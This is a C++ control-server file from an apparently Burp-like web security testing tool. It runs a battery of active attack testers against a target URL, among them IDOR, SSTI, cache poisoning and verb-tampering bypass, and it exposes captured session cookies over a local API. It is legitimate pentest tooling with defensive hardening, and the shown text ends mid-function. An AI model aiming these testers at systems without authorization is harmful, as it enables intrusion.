#include "control_server.hpp"

#include "cert_authority.hpp"
#include "extensions_api.hpp"
#include "intercept.hpp"
#include "ws_repeater.hpp"
#include "h2_events.hpp"
#include "oast_server.hpp"
#include "oast_correlator.hpp"
#include "dns_sink.hpp"
#include "session_rules.hpp"
#include "crawler.hpp"
#include "update_check.hpp"
#include "sequencer.hpp"
#include "intruder.hpp"
#include "chain_runner.hpp"
#include "jwt_tool.hpp"
#include "param_miner.hpp"
#include "idor_tester.hpp"
#include "mass_assign.hpp"
#include "cors_tester.hpp"
#include "js_recon.hpp"
#include "race_tester.hpp"
#include "verb_tamper.hpp"
#include "ssti_tester.hpp"
#include "cache_poison.hpp"
#include "open_redirect.hpp"
#include "networking.hpp"
#include "passive_scanner.hpp"
#include "port_scanner.hpp"
#include "project_store.hpp"
#include "recon_engine.hpp"
#include "session_manager.hpp"
#include "Proxy/proxy_filter_model.hpp"
#include "Proxy/proxy_model.hpp"
#include "Proxy/site_map_model.hpp"
#include "proxy_server.hpp"
#include "repeater.hpp"
#include "themes_manager.hpp"

#include <QAtomicInteger>
#include <QByteArray>
#include <QDateTime>
#include <QPointer>
#include <QtConcurrent/QtConcurrent>
#include <QFile>
#include <QThread>
#include <QRandomGenerator>
#include <QFileInfo>
#include <QHash>
#include <QMap>
#include <QSet>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonValue>
#include <QMetaObject>
#include <QPair>
#include <QStringList>
#include <QTcpServer>
#include <QXmlStreamReader>
#include <QTcpSocket>
#include <QElapsedTimer>
#include <QUrl>
#include <QUrlQuery>

namespace Nullock::Control {

namespace {

constexpr int     kReadTimeoutMs = 5'000;
// Absolute wall-clock budget for receiving the full request header block.
// Defeats slowloris: a client dribbling one byte every 4.9s would refill
// the per-read kReadTimeoutMs forever, but the elapsed-since-accept clock
// keeps counting and drops them at 10s regardless. 10s is generous for
// any honest client on localhost.
constexpr qint64  kHeaderDeadlineMs = 10'000;
// Similar deadline for receiving the request body once headers have been
// parsed. A POST body of up to kMaxBodyBytes on localhost completes in
// well under 30s.
constexpr qint64  kBodyDeadlineMs   = 30'000;
// Hard cap on request body size accepted by /api/*. Big enough for HAR
// imports of medium projects (~32 MB), small enough that a malicious
// 4 GB POST can't OOM us. Returns 413 above this.
constexpr qint64  kMaxBodyBytes  = 64LL * 1024 * 1024;

// ---- Deep-scan audit helper --------------------------------------------
// Runs the active-testing battery against one target and emits one summary
// finding per tester that hit. Shared by /api/audit/run (single URL, sync)
// and /api/audit/all (many URLs/rows, off-thread). `reportsOut` collects a
// per-tester JSON summary; returns the number of distinct testers that
// surfaced an issue.
struct AuditTarget {
    QString host;
    int     port = 443;
    bool    tls  = true;
    QString method = QStringLiteral("GET");
    QString basePath;
    QByteArray body;
    QString contentType;
    QList<QPair<QString, QString>> headers;
    QString url;            // display URL for findings
};

int runDeepAudit(Nullock::Core::PassiveScanner *sc, const AuditTarget &t,
                 const QSet<QString> &include, QJsonArray &reportsOut) {
    int total = 0;
    auto wants = [&](const QString &n) { return include.isEmpty() || include.contains(n); };
    auto note = [&](const QString &tester, int items, const QString &detail,
                    const QString &sev, const QString &kind, const QString &summary) {
        reportsOut.append(QJsonObject{
            { "tester", tester }, { "items", items }, { "detail", detail },
            { "url", t.url } });
        if (items > 0) {
            ++total;
            // Marshal the emission onto the scanner's own thread: runDeepAudit
            // runs on a background worker for /api/audit/all, and reportFinding
            // emits findingsChanged() -- firing that cross-thread would run
            // UI/stdout handlers on the worker. A queued invoke is safely
            // dropped if the scanner is already gone.
            if (sc) {
                const QString host = t.host, url = t.url, ev = "found by deep audit: " + detail;
                QMetaObject::invokeMethod(sc, [sc, sev, kind, summary, ev, host, url]() {
                    sc->reportFinding(0, sev, kind, summary, ev, host, url);
                }, Qt::QueuedConnection);
            }
        }
    };

    if (wants("params") || wants("param-mining")) {
        Nullock::Core::ParamMiner::Request pr;
        pr.host = t.host; pr.port = t.port; pr.tls = t.tls;
        pr.method = t.method; pr.basePath = t.basePath; pr.headers = t.headers;
        const auto res = Nullock::Core::ParamMiner::mine(
            pr, Nullock::Core::ParamMiner::defaultWordlist().mid(0, 60));
        QStringList names; for (const auto &f : res.found) names << f.name;
        note("param-mining", res.found.size(),
             QString("%1 found: %2").arg(res.found.size()).arg(names.join(", ")),
             "medium", "hidden-param",
             "Deep audit: hidden parameter(s) " + names.join(", "));
    }
    if (wants("verbs") || wants("verb-tampering")) {
        Nullock::Core::VerbTamper::Request vr;
        vr.host = t.host; vr.port = t.port; vr.tls = t.tls;
        vr.method = t.method; vr.basePath = t.basePath; vr.headers = t.headers; vr.body = t.body;
        const auto res = Nullock::Core::VerbTamper::test(vr);
        QStringList techs; for (const auto &b : res.bypasses) techs << b.technique;
        note("verb-tampering", res.bypasses.size(),
             res.baselineDenied ? techs.join(", ") : "baseline not denied (skipped)",
             "high", "auth-bypass-verb-tampering",
             "Deep audit: verb-tampering bypass via " + techs.join(", "));
    }
    if (wants("cors")) {
        Nullock::Core::CorsTester::Request cr;
        cr.host = t.host; cr.port = t.port; cr.tls = t.tls;
        cr.method = "GET"; cr.basePath = t.basePath; cr.headers = t.headers;
        const auto res = Nullock::Core::CorsTester::test(cr);
        int n = 0; QString worst = "low";
        for (const auto &p : res.probes) {
            if (p.severity.isEmpty()) continue;
            ++n;
            if (p.severity == "critical") worst = "critical";
            else if (p.severity == "high" && worst != "critical") worst = "high";
            else if (p.severity == "medium" && worst == "low") worst = "medium";
        }
        note("cors", n, QString("%1 reflected origin(s)").arg(n),
             worst, "cors-reflected-credentialed",
             "Deep audit: CORS reflects untrusted origin(s)");
    }
    if (wants("idor")) {
        Nullock::Core::IdorTester::Request ir;
        ir.host = t.host; ir.port = t.port; ir.tls = t.tls;
        ir.method = t.method; ir.basePath = t.basePath; ir.headers = t.headers;
        const auto res = Nullock::Core::IdorTester::test(ir);
        QStringList locs; for (const auto &f : res.findings) locs << f.loc.descriptor;
        note("idor", res.findings.size(),
             QString("%1 id location(s) checked, %2 exposed ")
                 .arg(res.idLocationsFound).arg(res.findings.size()) + locs.join(", "),
             "high", "idor-horizontal", "Deep audit: IDOR at " + locs.join(", "));
    }
    if ((wants("massassign") || wants("mass-assignment")) && !t.body.isEmpty()) {
        Nullock::Core::MassAssign::Request mr;
        mr.host = t.host; mr.port = t.port; mr.tls = t.tls;
        const bool isWrite = t.method == "POST" || t.method == "PUT" || t.method == "PATCH";
        mr.method = isWrite ? t.method : QStringLiteral("POST");
        mr.basePath = t.basePath; mr.headers = t.headers; mr.body = t.body;
        mr.contentType = t.contentType;
        const auto res = Nullock::Core::MassAssign::test(mr, Nullock::Core::MassAssign::defaultFields());
        QStringList fields; for (const auto &f : res.found) fields << f.field;
        note("mass-assignment", res.found.size(), fields.join(", "),
             "high", "mass-assignment", "Deep audit: mass-assignable field(s) " + fields.join(", "));
    }
    // The path/query split shared by the URL-based testers below.
    const int qpos = t.basePath.indexOf('?');
    const QString auditPath  = qpos < 0 ? t.basePath : t.basePath.left(qpos);
    const QString auditQuery = qpos < 0 ? QString()  : t.basePath.mid(qpos + 1);

    if (wants("openredirect") || wants("redirect")) {
        Nullock::Core::OpenRedirect::Request orq;
        orq.host = t.host; orq.port = t.port; orq.tls = t.tls;
        orq.method = t.method; orq.headers = t.headers;
        orq.basePath = auditPath; orq.query = auditQuery;   // param auto-detected
        const auto res = Nullock::Core::OpenRedirect::test(orq);
        QStringList techs; for (const auto &h : res.hits) techs << h.technique;
        // Header-confirmed (Location) is high; client-side-only is medium.
        bool headerConfirmed = false;
        for (const auto &h : res.hits) if (h.via == "Location") headerConfirmed = true;
        note("open-redirect", res.hits.size(),
             res.error.isEmpty()
                 ? QString("param %1: %2").arg(res.testedParam, techs.join(", "))
                 : res.error,
             headerConfirmed ? "high" : "medium", "open-redirect",
             "Deep audit: open redirect in '" + res.testedParam + "'");
    }
    if (wants("cache") || wants("cachepoison")) {
        Nullock::Core::CachePoison::Request cpr;
        cpr.host = t.host; cpr.port = t.port; cpr.tls = t.tls;
        cpr.method = QStringLiteral("GET"); cpr.headers = t.headers;
        cpr.basePath = auditPath; cpr.query = auditQuery;
        const auto res = Nullock::Core::CachePoison::test(cpr);
        QStringList hdrs2; for (const auto &h : res.hits) hdrs2 << h.header;
        const QString sev  = res.anyConfirmed ? "critical" : (res.anyCacheable ? "high" : "low");
        const QString kind = res.anyConfirmed ? "web-cache-poisoning-confirmed"
                           : (res.anyCacheable ? "web-cache-poisoning"
                                               : "web-cache-unkeyed-reflected");
        note("cache-poisoning", res.hits.size(),
             res.error.isEmpty() ? hdrs2.join(", ") : res.error,
             sev, kind, "Deep audit: unkeyed header(s) " + hdrs2.join(", "));
    }
    if (wants("ssti")) {
        // Test each query parameter (capped) for template injection.
        QUrlQuery qq(auditQuery);
        const auto items = qq.queryItems();
        int hits = 0; QStringList engines;
        for (int i = 0; i < items.size() && i < 5; ++i) {
            Nullock::Core::Ssti::Request sr;
            sr.host = t.host; sr.port = t.port; sr.tls = t.tls; sr.method = t.method;
            sr.basePath = auditPath; sr.query = auditQuery; sr.headers = t.headers;
            sr.paramName = items[i].first; sr.paramIn = QStringLiteral("query");
            const auto res = Nullock::Core::Ssti::test(sr);
            if (res.confirmed) { ++hits; engines << res.engines; }
        }
        note("ssti", hits, hits ? engines.join("; ") : "no template injection",
             "critical", "ssti-confirmed", "Deep audit: SSTI (" + engines.join("; ") + ")");
    }
    return total;
}

QByteArray mimeFor(const QString &path) {
    const QString p = path.toLower();
    if (p.endsWith(".html") || p.endsWith(".htm")) return "text/html; charset=utf-8";
    if (p.endsWith(".jsx") || p.endsWith(".js"))   return "application/javascript; charset=utf-8";
    if (p.endsWith(".css"))   return "text/css; charset=utf-8";
    if (p.endsWith(".json"))  return "application/json; charset=utf-8";
    if (p.endsWith(".png"))   return "image/png";
    if (p.endsWith(".svg"))   return "image/svg+xml";
    if (p.endsWith(".woff2")) return "font/woff2";
    if (p.endsWith(".ico"))   return "image/x-icon";
    return "application/octet-stream";
}

QByteArray httpResponse(int status, const QByteArray &mime,
                        const QByteArray &body,
                        const QByteArray &reason = {}) {
    QByteArray out;
    out += "HTTP/1.1 " + QByteArray::number(status) + " "
         + (reason.isEmpty() ? QByteArray("OK") : reason) + "\r\n";
    out += "Content-Type: " + mime + "\r\n";
    out += "Content-Length: " + QByteArray::number(body.size()) + "\r\n";
    // No Access-Control-Allow-Origin -- the control server is local-only
    // and exposes private state (proxy history, captured creds). ACAO:*
    // would let any web page in the user's browser read it cross-origin.
    // Same-origin policy is the protection.
    out += "X-Content-Type-Options: nosniff\r\n";
    out += "Cache-Control: no-store\r\n";
    out += "Connection: close\r\n";
    out += "\r\n";
    out += body;
    return out;
}

QByteArray httpJson(int status, const QJsonObject &o) {
    return httpResponse(status, "application/json; charset=utf-8",
                        QJsonDocument(o).toJson(QJsonDocument::Compact));
}

QByteArray httpJson(int status, const QJsonArray &a) {
    return httpResponse(status, "application/json; charset=utf-8",
                        QJsonDocument(a).toJson(QJsonDocument::Compact));
}

QString safeJoin(const QString &dir, const QString &rel) {
    // Strip leading slashes, refuse "..", normalize separators.
    QString r = rel;
    while (r.startsWith('/') || r.startsWith('\\')) r.remove(0, 1);
    if (r.contains("..")) return {};
    return dir + "/" + r;
}

QJsonArray headersToJson(const QList<QPair<QString, QString>> &headers) {
    QJsonArray arr;
    for (const auto &kv : headers) {
        QJsonArray pair;
        pair.append(kv.first);
        pair.append(kv.second);
        arr.append(pair);
    }
    return arr;
}

} // namespace

ControlServer::ControlServer(const Wiring &w, QObject *parent)
    : QObject(parent), m_wiring(w), m_server(new QTcpServer(this)) {
    connect(m_server, &QTcpServer::newConnection, this, &ControlServer::onNewConnection);

    // Bump the snapshot fingerprint whenever any backend object reports a
    // change. The /api/snapshot endpoint accepts ?since=<seq> -- if seq
    // hasn't changed, we return 304 with no body, saving the JSON build.
    auto bump = [this]() { ++m_seq; };
    if (m_wiring.history) {
        connect(m_wiring.history, &QAbstractItemModel::rowsInserted, this, bump);
        connect(m_wiring.history, &QAbstractItemModel::modelReset,   this, bump);
        connect(m_wiring.history, &QAbstractItemModel::dataChanged,  this, bump);
    }
    if (m_wiring.intruder) {
        connect(m_wiring.intruder, &QAbstractItemModel::rowsInserted, this, bump);
        connect(m_wiring.intruder, &QAbstractItemModel::modelReset,   this, bump);
        connect(m_wiring.intruder, &QAbstractItemModel::dataChanged,  this, bump);
    }
    if (m_wiring.proxy) {
        connect(m_wiring.proxy, &Nullock::Proxy::ProxyServer::runningChanged,       this, bump);
        connect(m_wiring.proxy, &Nullock::Proxy::ProxyServer::filteredCountChanged, this, bump);
    }
    if (m_wiring.intercept) {
        connect(m_wiring.intercept, &Nullock::Proxy::InterceptController::currentChanged, this, bump);
        connect(m_wiring.intercept, &Nullock::Proxy::InterceptController::enabledChanged, this, bump);
    }
    if (m_wiring.projectStore) {
        connect(m_wiring.projectStore, &Nullock::Core::ProjectStore::scopeChanged, this, bump);
        connect(m_wiring.projectStore, &Nullock::Core::ProjectStore::rulesChanged, this, bump);
    }
    if (m_wiring.themes) {
        connect(m_wiring.themes, &Nullock::FrontEnd::ThemesManager::themeChanged,  this, bump);
        connect(m_wiring.themes, &Nullock::FrontEnd::ThemesManager::themesChanged, this, bump);
    }
    if (m_wiring.repeater) {
        connect(m_wiring.repeater, &Nullock::Core::Repeater::responseChanged, this, bump);
        connect(m_wiring.repeater, &Nullock::Core::Repeater::busyChanged,     this, bump);
        connect(m_wiring.repeater, &Nullock::Core::Repeater::targetChanged,   this, bump);
        connect(m_wiring.repeater, &Nullock::Core::Repeater::tabsChanged,     this, bump);
    }
    if (m_wiring.scanner) {
        connect(m_wiring.scanner, &Nullock::Core::PassiveScanner::findingsChanged,
                this, bump);
    }
    if (m_wiring.portScanner) {
        connect(m_wiring.portScanner, &Nullock::Core::PortScanner::progressChanged,
                this, bump);
        connect(m_wiring.portScanner, &Nullock::Core::PortScanner::resultsChanged,
                this, bump);
        connect(m_wiring.portScanner, &Nullock::Core::PortScanner::runningChanged,
                this, bump);
    }
    if (m_wiring.recon) {
        connect(m_wiring.recon, &Nullock::Core::ReconEngine::dnsRecordsChanged,
                this, bump);
        connect(m_wiring.recon, &Nullock::Core::ReconEngine::subdomainsChanged,
                this, bump);
        connect(m_wiring.recon, &Nullock::Core::ReconEngine::runningChanged,
                this, bump);
    }
    if (m_wiring.sessions) {
        connect(m_wiring.sessions, &Nullock::Core::SessionManager::sessionsChanged,
                this, bump);
    }
}

void ControlServer::bumpSeq() { ++m_seq; }

bool ControlServer::start(const QHostAddress &address, quint16 port) {
    if (m_server->isListening()) return true;
    // 9000/9001 are MinIO defaults so we skip them. 9090 is Prometheus.
    // Pick high-obscure-ports that no common service squats on.
    const QList<quint16> tries = {
        port, 17777, 27777, 37777, 47777, 57777,
    };
    for (quint16 p : tries) {
        if (m_server->listen(address, p)) return true;
    }
    return false;
}

void ControlServer::stop() {
    if (m_server->isListening()) m_server->close();
}

bool ControlServer::isRunning() const { return m_server->isListening(); }
quint16 ControlServer::listeningPort() const { return m_server->serverPort(); }

void ControlServer::onNewConnection() {
    while (QTcpSocket *s = m_server->nextPendingConnection()) {
        connect(s, &QTcpSocket::disconnected, s, &QObject::deleteLater);
        handle(s);
    }
}

void ControlServer::handle(QTcpSocket *socket) {
    // Slowloris defence. Track an absolute wall-clock since accept(); even
    // if the client refills the per-read kReadTimeoutMs by dribbling one
    // byte every 4.9s, the deadline keeps counting and drops them at
    // kHeaderDeadlineMs. Without this, 50 dribbling sockets would each pin
    // the main thread's handle() loop forever and freeze the entire API
    // surface (the UI included, since it polls /api/snapshot).
    QElapsedTimer deadline;
    deadline.start();

    // Read until headers complete.
    QByteArray buf;
    while (!buf.contains("\r\n\r\n")) {
        const qint64 remaining = kHeaderDeadlineMs - deadline.elapsed();
        if (remaining <= 0) {
            socket->write(httpResponse(408, "text/plain", "Header read timeout"));
            socket->disconnectFromHost();
            return;
        }
        const int waitMs = static_cast<int>(std::min<qint64>(remaining, kReadTimeoutMs));
        if (socket->bytesAvailable() == 0 && !socket->waitForReadyRead(waitMs)) {
            socket->disconnectFromHost();
            return;
        }
        buf.append(socket->readAll());
        if (buf.size() > 64 * 1024) {
            socket->write(httpResponse(431, "text/plain", "Headers too large"));
            socket->disconnectFromHost();
            return;
        }
    }

    const int sep = buf.indexOf("\r\n\r\n");
    const QByteArray header = buf.left(sep);
    QByteArray rest = buf.mid(sep + 4);

    const int firstLineEnd = header.indexOf("\r\n");
    const QByteArray requestLine = header.left(firstLineEnd);
    const QList<QByteArray> parts = requestLine.split(' ');
    if (parts.size() < 3) {
        socket->write(httpResponse(400, "text/plain", "Bad request"));
        socket->disconnectFromHost();
        return;
    }
    const QString method = QString::fromLatin1(parts[0]);
    const QString target = QString::fromLatin1(parts[1]);

    // Read body if Content-Length set (for POSTs). While we're walking
    // the headers, also capture Origin + the custom token + Host so we
    // can do a CSRF + DNS-rebinding check before dispatch.
    qint64 contentLength = 0;
    QString origin;
    QString nullockHdr;
    QString hostHdr;
    for (const QByteArray &line : header.split('\n')) {
        QByteArray l = line; if (l.endsWith('\r')) l.chop(1);
        const int c = l.indexOf(':');
        if (c <= 0) continue;
        const QString key = QString::fromLatin1(l.left(c));
        if (key.compare("Content-Length", Qt::CaseInsensitive) == 0) {
            bool ok = false;
            contentLength = QByteArray(l.mid(c + 1)).trimmed().toLongLong(&ok);
            if (!ok || contentLength < 0 || contentLength > kMaxBodyBytes) {
                socket->write(httpResponse(413, "text/plain",
                    "Content-Length invalid or too large"));
                socket->waitForBytesWritten(kReadTimeoutMs);
                socket->disconnectFromHost();
                return;
            }
        }
        else if (key.compare("Origin", Qt::CaseInsensitive) == 0)
            origin = QString::fromLatin1(QByteArray(l.mid(c + 1)).trimmed());
        else if (key.compare("X-Nullock-UI", Qt::CaseInsensitive) == 0)
            nullockHdr = QString::fromLatin1(QByteArray(l.mid(c + 1)).trimmed());
        else if (key.compare("Host", Qt::CaseInsensitive) == 0)
            hostHdr = QString::fromLatin1(QByteArray(l.mid(c + 1)).trimmed());
    }

    // DNS-rebinding defence. The browser's same-origin policy is "scheme +
    // host + port" -- a malicious page on evil.com whose DNS flips to
    // resolve to 127.0.0.1 (low-TTL DNS rebinding) will still consider
    // itself same-origin with the proxy, and SOP will let it read our
    // responses. The Origin/X-Nullock-UI guard only covers writes; for
    // reads we have to look at the Host header. A rebinded request still
    // carries `Host: evil.com` because the browser uses the URL the page
    // requested. Refuse anything whose Host isn't bound to us.
    const quint16 myPort = this->listeningPort();
    const QString portStr = QString::number(myPort);
    static const QSet<QString> kAllowedHosts = {
        "127.0.0.1:" + portStr,
        "localhost:" + portStr,
        "[::1]:" + portStr,
        // Some clients omit the port when it's the default; we never
        // listen on 80 by default, but allow plain hostnames just in case.
        "127.0.0.1",
        "localhost",
        "[::1]",
    };
    if (!hostHdr.isEmpty() && !kAllowedHosts.contains(hostHdr.toLower())) {
        socket->write(httpResponse(421, "text/plain",
            "Misdirected Host (DNS rebinding defence)"));
        socket->waitForBytesWritten(kReadTimeoutMs);
        socket->disconnectFromHost();
        return;
    }

    // Method validation: known HTTP verbs only. Closes the GET-to-mutating-
    // endpoint vector (probe / replay used to accept any method).
    static const QStringList kAllowed = {
        "GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS"
    };
    if (!kAllowed.contains(method)) {
        socket->write(httpResponse(405, "text/plain", "Method not allowed"));
        socket->waitForBytesWritten(kReadTimeoutMs);
        socket->disconnectFromHost();
        return;
    }

    // CSRF guard, hardened. State-mutating endpoints (anything that's
    // not a GET / HEAD / OPTIONS) require BOTH:
    //   (a) a matching same-origin Origin header OR a custom X-Nullock-UI
    //       header that non-browser clients can set freely; and
    //   (b) explicitly NOT an empty Origin when sent from a browser --
    //       previously we allowed empty Origin to pass for curl
    //       compatibility, but a `file://`-loaded HTML page also sends
    //       empty Origin so this bypassed the guard.
    // The custom header costs nothing for scripts (curl sets it via -H),
    // but a malicious cross-origin page can't add it without a CORS
    // preflight, which we never grant.
    const bool isReadMethod = (method == "GET" || method == "HEAD" || method == "OPTIONS");
    if (!isReadMethod) {
        const quint16 myPort = this->listeningPort();
        const QString expectedHttp  = "http://127.0.0.1:"  + QString::number(myPort);
        const QString expectedLocal = "http://localhost:"  + QString::number(myPort);
        const bool originOk = (origin == expectedHttp || origin == expectedLocal);
        const bool tokenOk  = (nullockHdr == "1" || nullockHdr.toLower() == "true");
        if (!originOk && !tokenOk) {
            socket->write(httpResponse(403, "text/plain",
                "Cross-origin write rejected (need same-origin Origin or X-Nullock-UI: 1)"));
            socket->waitForBytesWritten(kReadTimeoutMs);
            socket->disconnectFromHost();
            return;
        }
    }
    // Body-side slowloris defence: same absolute-deadline pattern. A POST
    // claiming kMaxBodyBytes that dribbles in below ~2 MB/sec is either a
    // hostile slow-read or a network so broken there's nothing useful we
    // can do with the result anyway.
    QElapsedTimer bodyDeadline;
    bodyDeadline.start();
    while (rest.size() < contentLength) {
        const qint64 remaining = kBodyDeadlineMs - bodyDeadline.elapsed();
        if (remaining <= 0) {
            socket->disconnectFromHost();
            return;
        }
        const int waitMs = static_cast<int>(std::min<qint64>(remaining, kReadTimeoutMs));
        if (!socket->waitForReadyRead(waitMs)) break;
        rest.append(socket->readAll());
    }
    const QByteArray body = rest.left(contentLength);

    // Route.
    const QUrl url(QStringLiteral("http://x") + target);
    const QString path  = url.path();
    const QString query = url.query();

    QByteArray response;
    if (path.startsWith("/api/")) {
        response = apiResponse(method, path, body, query);
    } else if (path == "/ca.pem" || path == "/ca.crt") {
        // CA cert download. /ca.crt is an alias that triggers the system
        // "install profile" prompt on iOS/Android when opened directly.
        // PEM-formatted; iOS/Android both accept PEM under .crt mime.
        if (!m_wiring.ca || m_wiring.ca->caCertPath().isEmpty()) {
            response = httpResponse(404, "text/plain", "CA not initialized");
        } else {
            QFile f(m_wiring.ca->caCertPath());
            if (!f.open(QIODevice::ReadOnly)) {
                response = httpResponse(500, "text/plain", "could not read CA");
            } else {
                QByteArray hdr;
                hdr += "HTTP/1.1 200 OK\r\n";
                hdr += "Content-Type: application/x-x509-ca-cert\r\n";
                hdr += "Content-Disposition: attachment; filename=\"nullock-ca.crt\"\r\n";
                hdr += "Access-Control-Allow-Origin: *\r\n";
                hdr += "Connection: close\r\n";
                const QByteArray body = f.readAll();
                hdr += "Content-Length: " + QByteArray::number(body.size()) + "\r\n\r\n";
                response = hdr + body;
            }
        }
    } else {
        const QString rel = (path == "/" || path.isEmpty())
                              ? QStringLiteral("Nullock.html")
                              : path;
        response = staticResponse(rel);
    }

    socket->write(response);
    socket->waitForBytesWritten(kReadTimeoutMs);
    socket->disconnectFromHost();
}

QByteArray ControlServer::staticResponse(const QString &path) const {
    if (m_wiring.uiDir.isEmpty())
        return httpResponse(500, "text/plain", "ui dir not configured");
    const QString fsPath = safeJoin(m_wiring.uiDir, path);
    if (fsPath.isEmpty() || !QFileInfo::exists(fsPath))
        return httpResponse(404, "text/plain", "Not found: " + path.toUtf8());
    QFile f(fsPath);
    if (!f.open(QIODevice::ReadOnly))
        return httpResponse(500, "text/plain", "could not open " + path.toUtf8());
    return httpResponse(200, mimeFor(path), f.readAll());
}

QByteArray ControlServer::buildSnapshot() const {
    QJsonObject root;
    root["seq"] = static_cast<qint64>(m_seq);

    // bootInfo
    QJsonObject bootInfo;
    bootInfo["port"]            = m_wiring.proxy ? m_wiring.proxy->listeningPort() : 0;
    bootInfo["caPath"]          = m_wiring.ca ? m_wiring.ca->caCertPath() : QString();
    bootInfo["caDir"]           = m_wiring.ca ? m_wiring.ca->caDir()      : QString();
    bootInfo["hasOpenssl"]      = m_wiring.ca ? m_wiring.ca->hasOpenssl() : false;
    bootInfo["project"]         = m_wiring.projectStore ? m_wiring.projectStore->metadata().name : QString();
    bootInfo["projectDir"]      = m_wiring.projectStore ? m_wiring.projectStore->currentPath() : QString();
    bootInfo["harPath"]         = m_wiring.projectStore ? (m_wiring.projectStore->currentPath() + "/exports/")
                                                       : QString();
    bootInfo["loadedExtensions"]= m_wiring.extensions ? m_wiring.extensions->loadedCount() : 0;
    bootInfo["proxyOn"]         = m_wiring.proxy ? m_wiring.proxy->isRunning() : false;
    bootInfo["h2UpstreamCount"] = m_wiring.proxy ? m_wiring.proxy->h2UpstreamCount() : 0;
    bootInfo["filteredCount"]   = m_wiring.proxy ? m_wiring.proxy->filteredCount() : 0;
    if (m_wiring.proxy) {
        QJsonArray blocked;
        for (const QString &h : m_wiring.proxy->blockedHosts()) blocked.append(h);
        bootInfo["mitmBlocked"]     = blocked;
        bootInfo["controlPort"]     = static_cast<int>(this->listeningPort());
    }
    if (m_wiring.extensions) {
        QJsonArray extLog;
        for (const QString &line : m_wiring.extensions->recentLog(40))
            extLog.append(line);
        bootInfo["extensionsLog"]     = extLog;
        QJsonArray scripts;
        for (const QString &s : m_wiring.extensions->loadedScripts())
            scripts.append(s);
        bootInfo["extensionScripts"]  = scripts;
        bootInfo["extensionsDir"]     = m_wiring.extensions->extensionsDir();
    }
    root["bootInfo"] = bootInfo;

    // themes
    QJsonArray themes;
    if (m_wiring.themes) {
        for (const QString &t : m_wiring.themes->availableThemes()) themes.append(t);
    }
    root["themes"] = themes;
    root["currentTheme"] = m_wiring.themes ? m_wiring.themes->currentTheme() : QString();

    // Colors of the current theme (CSS-style keys without the "--" prefix)
    // plus a flag so the UI can disable "Save" on built-ins (forks happen
    // automatically server-side but the UI may want to surface the rename).
    if (m_wiring.themes) {
        QJsonObject colors;
        const QVariantMap cur = m_wiring.themes->currentColors();
        for (auto it = cur.constBegin(); it != cur.constEnd(); ++it)
            colors.insert(it.key(), it.value().toString());
        root["themeColors"]    = colors;
        root["themeIsBuiltin"] = m_wiring.themes->isBuiltin(m_wiring.themes->currentTheme());
        root["themesDir"]      = m_wiring.themes->themesDir();
    }

    // scope
    QJsonObject scope;
    QJsonArray inArr;
    QJsonArray outArr;
    if (m_wiring.projectStore) {
        for (const QString &s : m_wiring.projectStore->metadata().inScope) inArr.append(s);
        for (const QString &s : m_wiring.projectStore->metadata().outOfScope) outArr.append(s);
        scope["notes"] = m_wiring.projectStore->metadata().notes;
    }
    scope["in"]  = inArr;
    scope["out"] = outArr;
    root["scope"] = scope;

    // match & replace rules
    QJsonArray rulesArr;
    if (m_wiring.projectStore) {
        for (const auto &r : m_wiring.projectStore->rules()) {
            QJsonObject ro;
            ro["enabled"]         = r.enabled;
            ro["name"]            = r.name;
            ro["hostGlob"]        = r.hostGlob;
            ro["section"]         = static_cast<int>(r.section);
            ro["find"]            = r.find;
            ro["replace"]         = r.replace;
            ro["caseInsensitive"] = r.caseInsensitive;
            ro["comment"]         = r.comment;
            rulesArr.append(ro);
        }
    }
    root["rules"] = rulesArr;
    if (m_wiring.proxy) root["rulesHit"] = m_wiring.proxy->rulesHit();

    // passive scanner findings (newest first, capped at 200 in snapshot
    // so a noisy run doesn't bloat every poll). full list is available
    // via /api/findings.
    QJsonArray findingsArr;
    if (m_wiring.scanner) {
        for (const auto &f : m_wiring.scanner->findings(200)) {
            QJsonObject fo;
            fo["id"]       = f.id;
            fo["rowId"]    = f.rowId;
            fo["ts"]       = f.ts.toString(Qt::ISODate);
            fo["severity"] = f.severity;
            fo["kind"]     = f.kind;
            fo["summary"]  = f.summary;
            fo["evidence"] = f.evidence;
            fo["host"]     = f.host;
            fo["url"]      = f.url;
            // Enrichment: CWE / OWASP / CVSS / compliance / fix
            fo["cwe"]        = f.cwe;
            fo["owasp"]      = f.owasp;
            fo["cvssScore"]  = f.cvssScore;
            fo["cvssVector"] = f.cvssVector;
            QJsonArray comp;
            for (const QString &c : f.compliance) comp.append(c);
            fo["compliance"] = comp;
            fo["fixSummary"] = f.fixSummary;
            findingsArr.append(fo);
        }
        root["findingsCount"] = m_wiring.scanner->count();
    }
    root["findings"] = findingsArr;

    // port scanner
    if (m_wiring.portScanner) {
        QJsonObject ps;
        ps["host"]    = m_wiring.portScanner->host();
        ps["running"] = m_wiring.portScanner->running();
        ps["done"]    = m_wiring.portScanner->done();
        ps["total"]   = m_wiring.portScanner->total();
        ps["error"]   = m_wiring.portScanner->lastError();
        QJsonArray rows;
        for (const auto &r : m_wiring.portScanner->results()) {
            QJsonObject ro;
            ro["host"]    = r.host;
            ro["port"]    = r.port;
            ro["status"]  = r.status;
            ro["latency"] = r.latencyMs;
            ro["banner"]  = r.banner;
            ro["service"] = r.service;
            rows.append(ro);
        }
        ps["results"] = rows;
        root["portScan"] = ps;
    }

    // recon engine: DNS records + discovered subdomains
    if (m_wiring.recon) {
        QJsonObject rec;
        rec["target"]  = m_wiring.recon->target();
        rec["running"] = m_wiring.recon->running();
        rec["error"]   = m_wiring.recon->lastError();
        QJsonArray dns;
        for (const auto &r : m_wiring.recon->dnsRecords()) {
            QJsonObject d;
            d["type"]     = r.type;
            d["value"]    = r.value;
            d["priority"] = r.priority;
            dns.append(d);
        }
        rec["dns"] = dns;
        QJsonArray subs;
        for (const auto &s : m_wiring.recon->subdomains()) {
            QJsonObject so;
            so["name"]   = s.name;
            so["source"] = s.source;
            QJsonArray ips;
            for (const QString &ip : s.resolvedIps) ips.append(ip);
            so["ips"]    = ips;
            subs.append(so);
        }
        rec["subdomains"] = subs;
        root["recon"] = rec;
    }

    // sessions: per-host captured cookies
    if (m_wiring.sessions) {
        QJsonArray arr;
        for (const auto &s : m_wiring.sessions->sessions()) {
            QJsonObject so;
            so["host"]       = s.host;
            so["autoInject"] = s.autoInject;
            so["lastSeen"]   = s.lastSeen;
            QJsonArray cookies;
            for (const auto &c : s.cookies) {
                QJsonObject co;
                co["name"]     = c.name;
                co["value"]    = c.value;
                co["path"]     = c.path;
